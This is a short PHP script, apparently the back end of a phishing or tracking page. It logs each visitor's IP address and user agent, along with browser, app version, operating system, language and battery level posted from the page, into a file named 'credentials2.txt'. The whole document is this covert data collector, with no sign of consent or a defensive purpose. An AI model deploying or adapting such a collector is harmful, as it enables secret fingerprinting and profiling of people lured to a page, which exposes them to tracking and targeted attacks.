<?php

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$navigator = $_POST['navegador'];
$versionapp = $_POST['versionapp'];
$dystro = $_POST['dystro'];
$lenguaje = $_POST['idioma'];
$bateri = $_POST['bateri'];

$file = fopen('credentials2.txt', 'w+');
fwrite($file, "
ip: $ip
user-agent: $user_agent
navegador: $navigator
versionApp: $versionapp
sistema opetativo: $dystro
lenguaje: $lenguaje
bateria: $bateri%
");
fclose($file);
?>
